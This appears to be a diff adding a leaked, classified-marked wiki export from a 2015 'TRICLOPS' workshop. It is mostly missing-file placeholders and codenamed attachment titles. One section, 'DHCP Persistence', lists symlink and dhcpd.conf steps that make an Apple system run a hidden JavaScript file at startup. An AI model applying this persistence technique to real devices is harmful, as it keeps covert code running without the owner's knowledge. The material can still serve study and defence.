@@ -1,0 +1,102 @@
+
+                        Owner: User #15728648
+(TS//SI//REL US, UK, CAN) TRICLOPS Summer 2015 - Ottawa
+TOP SECRET // SI // REL US, UK, CAN
+ 
+Below is an export of the wiki and related files from the workshop.
+ 
+
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+('view-file' missing)
+DHCP Persistence
+
+Create symlink from /usr/libexec/dhcpd to /sbin/mount_nfs
+Create a symlink from /private/var/root/Library/Lock/A/.conf file at /etc/dhcpd.conf
+The file contents should contain a line:execute("/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc", "/private/var/root/Library/Lock/A/.f.js")x
+
+
+
+('view-file' missing)
+ 
+TOP SECRET // SI // REL US, UK, CAN
+
+Attachments:
+
+
+dhcpd.conf
+
+
+sandbox_profile.ios.txt
+
+
+syslog.c
+
+
+Triclops 2015 - _Library_MusicUISupport_js_index.pdf
+
+
+Triclops 2015 - BillOfMaterial.pdf
+
+
+Triclops 2015 - ECHOMOON.pdf
+
+
+Triclops 2015 - Entitlements Dump.pdf
+
+
+Triclops 2015 - Home.pdf
+
+
+Triclops 2015 - KAMIKAZE.pdf
+
+
+Triclops 2015 - nsurlsessiond.pdf
+
+
+Triclops 2015 - Other.pdf
+
+
+Triclops 2015 - Patch Guard.pdf
+
+
+Triclops 2015 - PREDUX.pdf
+
+
+Triclops 2015 - Saline.pdf
+
+
+Triclops 2015 - Securing Our Equity.pdf
+
+
+Triclops 2015 - Status.pdf
+
+
+Triclops 2015 - The Syslog and how to forward it.pdf
+
+
+Triclops 2015 - TinyScheme.pdf
+
+
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+|
+                    
